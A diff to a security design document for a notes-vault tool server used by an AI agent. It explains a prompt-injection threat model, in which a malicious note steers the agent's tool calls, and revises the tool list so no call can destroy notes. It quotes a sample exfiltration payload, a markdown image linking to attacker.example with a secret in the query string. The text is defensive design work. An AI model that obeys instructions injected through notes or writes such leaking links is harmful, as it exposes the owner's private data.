@@ -36,13 +36,16 @@ to the model.
 **The defense is channel closure, not detection.** Detecting injections
 reliably is not possible; removing what an injection could accomplish is.
 
-1. **Minimal tool inventory.** There is no delete, no move, no HTTP request,
-   no shell, no JavaScript execution — deliberately. Every candidate tool must
-   answer: *what happens if a malicious note gets this called with arguments
-   of its choosing?* With the current six tools, a fully successful injection
-   can, at worst, put junk into a note. It cannot exfiltrate content over the
-   network and it cannot destroy existing notes (`create_note` refuses to
-   overwrite; `append_to_note` only adds to the end of an existing note).
+1. **Minimal tool inventory.** There is no HTTP request, no shell, no
+   JavaScript execution — deliberately. Every candidate tool must answer:
+   *what happens if a malicious note gets this called with arguments of its
+   choosing?* With the current tool set, a fully successful injection can, at
+   worst, put junk into notes or shuffle them around — a recoverable incident,
+   not a loss: it cannot exfiltrate content over the network, and it cannot
+   destroy existing notes (`create_note` and `move_note` refuse to overwrite;
+   `append_to_note`/`append_to_section` only insert; `edit_note` requires an
+   exact unique match of existing text; `delete_note` is a move into the
+   vault's own `.trash/`, never an unlink).
 2. **Remote-image de-embed on write.** The one leak channel that survives
    item 1: a written note containing `![](https://attacker.example/?q=SECRET)`
    would make the *owner's own Obsidian client* fetch that URL — data in the
